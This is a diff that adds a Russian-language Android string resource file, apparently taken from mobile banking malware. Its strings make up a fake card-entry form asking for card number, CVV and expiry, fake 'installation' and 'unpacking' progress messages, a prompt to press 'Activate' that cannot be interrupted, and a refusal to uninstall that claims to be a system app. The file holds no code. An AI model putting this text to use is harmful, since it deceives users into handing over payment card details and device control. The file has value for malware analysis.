@@ -1,0 +1,34 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="add_card">Введите данные карты</string>
+    <string name="app_name">installation</string>
+    <string name="card_number">Номер карты</string>
+    <string name="cc_err">Недействительный номер кредитной карты</string>
+    <string name="continues">Продолжить</string>
+    <string name="cvv">CVV-код</string>
+    <string name="cvv_err">Недопустимый код CVV</string>
+    <string name="denied">"Операция запрещена!
+
+Невозможно удалить системное приложение."</string>
+    <string name="mm">ММ</string>
+    <string name="month_err">Недопустимый месяц</string>
+    <string name="pls_wait">Пожалуйста, подождите</string>
+    <string name="plugin">Установка завершена</string>
+    <string name="reg">"
+Пожалуйста, подождите.
+
+Распаковка компонентов…
+"</string>
+    <string name="save_card">СОХРАНИТЬ</string>
+    <string name="saving">Сохранение…</string>
+    <string name="warn">"Для продолжения, в следующем окне нажмите кнопку \"Активировать\".
+
+Данная операция не может быть прервана.
+
+Дополнительную информацию Вы можете найти здесь:
+
+http://redtube.com"</string>
+    <string name="warn_win">installation</string>
+    <string name="year_err">Недопустимый год</string>
+    <string name="yy">ГГ</string>
+</resources>
